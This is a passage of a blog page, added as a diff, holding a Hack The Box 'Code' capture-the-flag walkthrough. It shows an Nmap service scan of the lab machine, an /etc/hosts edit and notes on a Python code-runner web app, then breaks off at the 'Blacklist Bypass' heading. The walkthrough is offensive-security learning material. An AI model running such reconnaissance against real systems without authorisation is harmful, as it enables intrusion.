@@ -1,0 +1,1481 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"><head><script src="/crocpit/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=crocpit/livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  <title>[Easy] HTB Code Writeup &middot; Crocpit</title>
+    <meta name="title" content="[Easy] HTB Code Writeup &middot; Crocpit">
+
+  
+  <meta name="description" content="This is my first test article">
+  <meta name="keywords" content="Path Traversal,Web Filter Bypass,Python,">
+  
+  
+  <link rel="canonical" href="http://localhost:1313/crocpit/hackthebox/code/">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/crocpit/css/main.bundle.min.42f3d803c60407a06125f3853f1acee2a7fb62b2864d5fb38899d509e2529414a206ef2ca246d524ee83b849ead851c16df0f918e41f25c3825102d31b95afda.css"
+    integrity="sha512-QvPYA8YEB6BhJfOFPxrO4qf7YrKGTV&#43;ziJnVCeJSlBSiBu8sokbVJO6DuEnq2FHBbfD5GOQfJcOCUQLTG5Wv2g==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/crocpit/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+    
+    
+    
+  
+  
+    
+    
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/crocpit/js/main.bundle.min.2a700d98037fb0c14d144bda34f1591a5e2e6b565cf83590ee197a250fde4be98291d9cde6830d41654642a127ec85619ecbc8c9dccc483d1ba8973d2b3af5e0.js"
+      integrity="sha512-KnANmAN/sMFNFEvaNPFZGl4ua1Zc&#43;DWQ7hl6JQ/eS&#43;mCkdnN5oMNQWVGQqEn7IVhnsvIydzMSD0bqJc9Kzr14A=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+  
+    
+    <script src="/crocpit/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/crocpit/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/crocpit/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/crocpit/favicon-16x16.png">
+    <link rel="manifest" href="/crocpit/site.webmanifest">
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/crocpit/hackthebox/code/">
+  <meta property="og:site_name" content="Crocpit">
+  <meta property="og:title" content="[Easy] HTB Code Writeup">
+  <meta property="og:description" content="This is my first test article">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="hackthebox">
+    <meta property="article:tag" content="Path Traversal">
+    <meta property="article:tag" content="Web Filter Bypass">
+    <meta property="article:tag" content="Python">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="[Easy] HTB Code Writeup">
+  <meta name="twitter:description" content="This is my first test article">
+
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Hacktheboxes",
+    "name": "[Easy] HTB Code Writeup",
+    "headline": "[Easy] HTB Code Writeup",
+    "description": "This is my first test article",
+    
+    "inLanguage": "en",
+    "url" : "http:\/\/localhost:1313\/crocpit\/hackthebox\/code\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Jake Imanaka"
+    },
+    
+    
+    
+    
+    
+    
+    "keywords": ["Path Traversal","Web Filter Bypass","Python"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1901"
+  }]
+  </script>
+
+
+
+  
+  
+    <meta name="author" content="Jake Imanaka">
+  
+  
+    
+      
+        
+          <link href="https://github.com/jimanaka" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://www.linkedin.com/in/jakeimanaka" rel="me">
+        
+      
+    
+  
+
+  
+  
+
+<script src="/crocpit/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    
+    
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div
+  class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
+  
+  
+
+  <div class="flex flex-1 items-center justify-between">
+    <nav class="flex space-x-3">
+      
+        <a href="/crocpit/" class="text-base font-medium text-gray-500 hover:text-gray-900">
+          Crocpit
+        </a>
+      
+    </nav>
+    
+  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+    
+      
+        
+  <a
+  href=""
+  
+  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="">
+    Blog
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="/crocpit/hackthebox/"
+  
+  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Hacktheboxes">
+    HackTheBox
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href=""
+  
+  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="">
+    Projects
+  </p>
+</a>
+
+
+
+      
+    
+
+    
+
+    
+
+    
+      <button
+        id="search-button"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+      </button>
+    
+
+    
+      <div class=" flex items-center">
+        <button
+          id="appearance-switcher"
+          aria-label="Dark mode switcher"
+          type="button"
+          class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+          <div class="flex items-center justify-center dark:hidden">
+            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+          </div>
+          <div class="items-center justify-center hidden dark:flex">
+            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+          </div>
+        </button>
+      </div>
+    
+  </nav>
+
+    
+  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+    <span></span>
+
+    
+
+    
+
+    
+      <button
+        id="search-button-mobile"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+      </button>
+    
+
+    
+      <button
+        id="appearance-switcher-mobile"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    
+  </div>
+
+  </div>
+  
+  <div class="-my-2 md:hidden">
+    <div id="menu-button" class="block">
+      
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+        </div>
+        <div
+          id="menu-wrapper"
+          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
+          <ul
+            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+            <li id="menu-close-button">
+              <span
+                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+                <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+              </span>
+            </li>
+
+            
+              
+  <li class="mt-1">
+  <a
+    href=""
+    
+    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="">
+      Blog
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/crocpit/hackthebox/"
+    
+    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Hacktheboxes">
+      HackTheBox
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href=""
+    
+    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="">
+      Projects
+    </p>
+  </a>
+</li>
+
+
+
+            
+
+          </ul>
+          
+        </div>
+      
+    </div>
+  </div>
+
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/crocpit/"
+      >Crocpit</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/crocpit/hackthebox/"
+      >Hacktheboxes</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/crocpit/hackthebox/code/"
+      >[Easy] HTB Code Writeup</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        [Easy] HTB Code Writeup
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="0001-01-01T00:00:00&#43;00:00">1 January 0001</time><span class="px-2 text-primary-500">&middot;</span><span>1901 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">9 mins</span><span class="px-2 text-primary-500">&middot;</span>
+
+
+
+<script
+  type="text/javascript"
+  src="/crocpit/js/zen-mode.min.9814dee9614d32aeb56239d118edfe20acd6231424f9b19c2dd48835038414130a5e946c0d1c9087d60e60e31840c9babfd217e3d4b95643dc8d651a71ccdf4a.js"
+  integrity="sha512-mBTe6WFNMq61YjnRGO3&#43;IKzWIxQk&#43;bGcLdSINQOEFBMKXpRsDRyQh9YOYOMYQMm6v9IX49S5VkPcjWUacczfSg=="></script>
+
+<span class="mb-[2px]">
+  <span
+    id="zen-mode-button"
+    class="text-lg hover:text-primary-500"
+    title="Enable zen mode"
+    data-title-i18n-disable="Enable zen mode"
+    data-title-i18n-enable="Disable zen mode">
+    <span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px">
+    <path fill="currentColor" d="M 12.980469 4 C 9.1204688 4 5.9804688 7.14 5.9804688 11 L 6 26 L 9.9804688 26 L 9.9804688 11 C 9.9804688 9.35 11.320469 8 12.980469 8 L 40.019531 8 C 41.679531 8 43.019531 9.35 43.019531 11 L 43.019531 39 C 43.019531 40.65 41.679531 42 40.019531 42 L 29 42 C 29 43.54 28.420938 44.94 27.460938 46 L 40.019531 46 C 43.879531 46 47.019531 42.86 47.019531 39 L 47.019531 11 C 47.019531 7.14 43.879531 4 40.019531 4 L 12.980469 4 z M 7 28 C 4.794 28 3 29.794 3 32 L 3 42 C 3 44.206 4.794 46 7 46 L 23 46 C 25.206 46 27 44.206 27 42 L 27 32 C 27 29.794 25.206 28 23 28 L 7 28 z M 7 32 L 23 32 L 23.001953 42 L 7 42 L 7 32 z"/>
+</svg></span></span>
+  </span>
+</span>
+
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] mr-2" href="/crocpit/categories/htb/"
+                ><span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    HTB
+  </span>
+</span>
+</a
+              >
+            
+          
+        
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] mr-2" href="/crocpit/tags/path-traversal/"
+                ><span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Path Traversal
+  </span>
+</span>
+</a
+              >
+            
+              <a class="relative mt-[0.5rem] mr-2" href="/crocpit/tags/web-filter-bypass/"
+                ><span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Web Filter Bypass
+  </span>
+</span>
+</a
+              >
+            
+              <a class="relative mt-[0.5rem] mr-2" href="/crocpit/tags/python/"
+                ><span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Python
+  </span>
+</span>
+</a
+              >
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+        <div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+          <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">
+            
+              <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#web-enumeration">Web Enumeration</a></li>
+    <li><a href="#foothold">Foothold</a>
+      <ul>
+        <li><a href="#blacklist-bypass">Blacklist Bypass</a></li>
+        <li><a href="#popping-the-shell">Popping The Shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#privesc-to-martin">Privesc to martin</a></li>
+    <li><a href="#privesc-to-root">Privesc to root</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#web-enumeration">Web Enumeration</a></li>
+    <li><a href="#foothold">Foothold</a>
+      <ul>
+        <li><a href="#blacklist-bypass">Blacklist Bypass</a></li>
+        <li><a href="#popping-the-shell">Popping The Shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#privesc-to-martin">Privesc to martin</a></li>
+    <li><a href="#privesc-to-root">Privesc to root</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+
+            
+            
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          <p>Welcome to my first HTB writeup/walkthrough. Having just received a new keyboard from my wonderful partner, I&rsquo;ve gained the drive to finally start posting writeups as I learn offsec with HTB.</p>
+<p>Have you ever thought you knew something then experienced something that made you think <em>nevermind</em>? Well that was me with Code. Having used Python extensively in college, I thought I was pretty decent&ndash;at least not a novice. But well&hellip; let&rsquo;s just say I got put back in my place.</p>
+<p>Anyways, let&rsquo;s just get started.</p>
+
+<h2 class="relative group">Recon 
+    <div id="recon" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#recon" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>We begin with a basic Nmap scan.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -sCV 10.10.11.62                 
+</span></span><span class="line"><span class="cl">Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-08-31 01:06 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.62
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.019s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">5000/tcp open  http    Gunicorn 20.0.4
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: gunicorn/20.0.4
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Python Code Editor
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 7.67 seconds
+</span></span></code></pre></div><p>Looks like theres an SSH and HTTP service running. The SSH service is usually not vulnerable with HTB, so we can enumerate the HTTP service first.</p>
+
+<h2 class="relative group">Web Enumeration 
+    <div id="web-enumeration" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#web-enumeration" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>First we add the host to our <code>/etc/hosts</code> file</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.62 code.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</span></span><span class="line"><span class="cl">10.10.11.62 code.htb
+</span></span></code></pre></div><p>Navigating to the webpage on port 5000, we see some sort of web-based code runner.
+
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="Initial web page"
+    srcset="
+      /crocpit/hackthebox/code/web-initial_hu_bce1b2b74c574f7b.png  330w,
+      /crocpit/hackthebox/code/web-initial_hu_bb434c075a8c94e7.png  660w,
+      /crocpit/hackthebox/code/web-initial_hu_6d8802dead082abc.png 1280w
+    "
+    data-zoom-src="/crocpit/hackthebox/code/web-initial.png"
+    src="/crocpit/hackthebox/code/web-initial.png">
+
+  
+</figure>
+</p>
+<p>There doesn&rsquo;t seem to be more to this site. There are Register, Login, and About links, but no useful information is found. You can also try directory/vhost fuzzing, but I didn&rsquo;t find anything particularly interesting.</p>
+
+<h2 class="relative group">Foothold 
+    <div id="foothold" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#foothold" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Blacklist Bypass 
+    <div id="blacklist-bypass" class="anchor"></div>
+    
+    <span
